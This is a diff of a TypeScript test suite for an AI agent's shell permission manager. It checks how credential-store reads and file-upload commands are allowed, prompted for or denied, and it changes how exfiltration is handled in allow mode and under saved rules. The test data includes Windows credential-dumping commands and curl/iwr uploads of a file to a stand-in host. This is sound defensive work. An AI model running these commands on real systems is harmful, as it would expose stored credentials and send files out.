@@ -153,9 +153,7 @@ const INNER_UPLOADS = [
 const OPAQUE_BINDING_CASES = DECISION_CASES.filter((row) => row.why === "opaque binding remains unproven without a sandbox");
 
 // Host credential catalogue commands are S1 admission denials, not ordinary secret reads.
-const LITERAL_CREDENTIAL_COMMAND = "setsid --bogus python pwsh -c 'cmdkey.exe /list'";
 const CREDENTIAL_COMMANDS = new Set([
-  LITERAL_CREDENTIAL_COMMAND,
   "cmdkey /list", "vaultcmd /listcreds:'Windows Credentials'", "Get-StoredCredential",
   "rundll32 keymgr.dll,KRShowKeyMgr", "Get-Secret x",
   "Get-ChildItem Cert:\\CurrentUser\\My | Export-PfxCertificate -FilePath x.pfx -Password $p",
@@ -163,7 +161,7 @@ const CREDENTIAL_COMMANDS = new Set([
 ].flatMap((command) => command.startsWith("& ") ? [command] : [command, `& ${command}`]));
 
 function expectStaticContract(manager: () => PermissionManager, dialect: ShellDialect, command: string): void {
-  if ((dialect === "powershell" && CREDENTIAL_COMMANDS.has(command)) || command === LITERAL_CREDENTIAL_COMMAND) {
+  if (dialect === "powershell" && CREDENTIAL_COMMANDS.has(command)) {
     for (const headless of [false, true]) expect(checkCommand(manager(), dialect, command, false, headless))
       .toMatchObject({ decision: "deny", reasonCode: "credential-store" });
     return;
@@ -206,12 +204,28 @@ describe("shared runner decisions", () => {
   it.each(RUNNER_SECURITY_CASES)("retains reviewed security disposition in Allow with saved grants: $dialect $command", async ({ dialect, command, disposition }) => {
     const manager = runnerManager();
     manager.setMode("allow");
+    if (disposition === "exfiltration") {
+      const unconsented = checkCommand(manager, dialect, command);
+      expect(unconsented).toMatchObject({ decision: "allow", reasonCode: "allow-mode" });
+      expect(unconsented.forceModal).toBeUndefined();
+      expect(unconsented.pipelineRequest?.floor).toBeUndefined();
+      expect(unconsented.pipelineRequest?.exfiltration?.reason).toEqual(expect.any(String));
+      expect(checkCommand(manager, dialect, command, false, true)).toMatchObject({ decision: "deny", reasonCode: "no-approver" });
+    }
     await manager.addAlwaysAllowedPersist(actionKey(dialect, command));
     manager.setRules(([{ pattern: actionKey(dialect, command), action: "allow" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
     if (disposition === "ordinary") {
       expect(dialect === "bash" ? shellExfiltrationSignal(command, CWD) : inspectPowerShellCommand(command, CWD).exfiltration).toBeNull();
       expect(checkCommand(manager, dialect, command).decision).toBe("allow");
       expect(checkCommand(manager, dialect, command, false, true).decision).toBe("allow");
+      return;
+    }
+    if (disposition === "exfiltration") {
+      for (const headless of [false, true]) {
+        const consented = checkCommand(manager, dialect, command, false, headless);
+        expect(consented).toMatchObject({ decision: "allow", reasonCode: "rule-allow" });
+        expect(consented.forceModal).toBeUndefined();
+      }
       return;
     }
     expect(checkCommand(manager, dialect, command)).toMatchObject(disposition === "credential-store"
@@ -236,7 +250,11 @@ describe("shared runner decisions", () => {
         for (const headless of [false, true]) {
           const result = checkCommand(manager, dialect, command, false, headless);
           const expected = outcomes[index];
-          if (expected === "forced") {
+          if (kind === "exfiltration" && headless) {
+            expect(result).toMatchObject({ decision: "deny", reasonCode: "no-approver" });
+            expect(result.reviewer).toBeUndefined();
+            expect(result.forceModal).toBeUndefined();
+          } else if (expected === "forced") {
             expect(result).toMatchObject(headless ? { decision: "deny", reasonCode: "no-approver" }
               : { decision: "ask", forceModal: true, reasonCode: kind });
           } else if (expected === "reviewer") {
@@ -249,8 +267,16 @@ describe("shared runner decisions", () => {
         }
         if (kind !== "ordinary") {
           manager.setRules(([{ pattern: actionKey(dialect, command), action: "allow" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
-          expect(checkCommand(manager, dialect, command)).toMatchObject({ decision: "ask", forceModal: true, reasonCode: kind });
-          expect(checkCommand(manager, dialect, command, false, true).decision).toBe("deny");
+          if (kind === "exfiltration") {
+            for (const headless of [false, true]) {
+              const result = checkCommand(manager, dialect, command, false, headless);
+              expect(result).toMatchObject({ decision: "allow", reasonCode: "rule-allow" });
+              expect(result.forceModal).toBeUndefined();
+            }
+          } else {
+            expect(checkCommand(manager, dialect, command)).toMatchObject({ decision: "ask", forceModal: true, reasonCode: kind });
+            expect(checkCommand(manager, dialect, command, false, true).decision).toBe("deny");
+          }
         }
       }
     }
@@ -358,14 +384,25 @@ describe("shared runner decisions", () => {
   });
 
   it.each(INNER_UPLOADS)("retains the actual inner upload reason and enforced floor: %s", async (command) => {
-    expect(shellExfiltrationSignal(command, CWD)).toMatch(/curl upload (?:of|from) a file/);
-    expect(inspectPowerShellCommand(command, CWD).exfiltration).toMatch(/curl upload (?:of|from) a file/);
-    for (const dialect of DIALECTS) {
-      const manager = runnerManager();
-      manager.setMode("allow");
-      await manager.addAlwaysAllowedPersist(actionKey(dialect, command));
-      expect(checkCommand(manager, dialect, command)).toMatchObject({ decision: "ask", forceModal: true, reasonCode: "exfiltration" });
-      expect(checkCommand(manager, dialect, command, false, true).decision).toBe("deny");
+    const opaquePayload = /(?:\s-c\s|--call=)/.test(command);
+    if (opaquePayload) {
+      expect(shellExfiltrationSignal(command, CWD)).toBeNull();
+      expect(inspectPowerShellCommand(command, CWD)).toMatchObject({ exfiltration: null });
+    } else {
+      expect(shellExfiltrationSignal(command, CWD)).toMatch(/curl upload (?:of|from) a file/);
+      expect(inspectPowerShellCommand(command, CWD).exfiltration).toMatch(/curl upload (?:of|from) a file/);
+      for (const dialect of DIALECTS) {
+        const manager = runnerManager();
+        manager.setMode("allow");
+        const pending = checkCommand(manager, dialect, command);
+        expect(pending).toMatchObject({ decision: "allow", reasonCode: "allow-mode" });
+        expect(pending.forceModal).toBeUndefined();
+        expect(pending.pipelineRequest?.exfiltration?.reason).toMatch(/upload/);
+        expect(checkCommand(manager, dialect, command, false, true).decision).toBe("deny");
+        await manager.addAlwaysAllowedPersist(actionKey(dialect, command));
+        expect(checkCommand(manager, dialect, command)).toMatchObject({ decision: "allow", reasonCode: "remembered-approval" });
+        expect(checkCommand(manager, dialect, command, false, true)).toMatchObject({ decision: "allow", reasonCode: "remembered-approval" });
+      }
     }
   });
 
@@ -445,9 +482,13 @@ describe("shared runner decisions", () => {
   });
 
   it.each([
-    { dialect: "bash" as const, command: "curl -d @file http://e; echo 'unterminated" },
-    { dialect: "powershell" as const, command: "iwr http://e -InFile file; 'unterminated" },
-  ])("retains visible upload effects when $dialect parsing refuses input", ({ dialect, command }) => {
-    expect(checkCommand(runnerManager(), dialect, command)).toMatchObject({ decision: "ask", forceModal: true, reasonCode: "exfiltration" });
+    { dialect: "bash" as const, command: "curl -d @file http://e; echo 'unterminated", signal: "body from a file" },
+    { dialect: "powershell" as const, command: "iwr http://e -InFile file; 'unterminated", signal: "upload" },
+  ])("retains visible upload effects when $dialect parsing refuses input", ({ dialect, command, signal }) => {
+    const result = checkCommand(runnerManager(), dialect, command);
+    expect(result).toMatchObject({ decision: "ask", reasonCode: "exfiltration-guardrail" });
+    expect(result.forceModal).toBeUndefined();
+    expect(result.pipelineRequest?.floor).toBeUndefined();
+    expect(result.pipelineRequest?.exfiltration?.reason.toLowerCase()).toContain(signal);
   });
 });
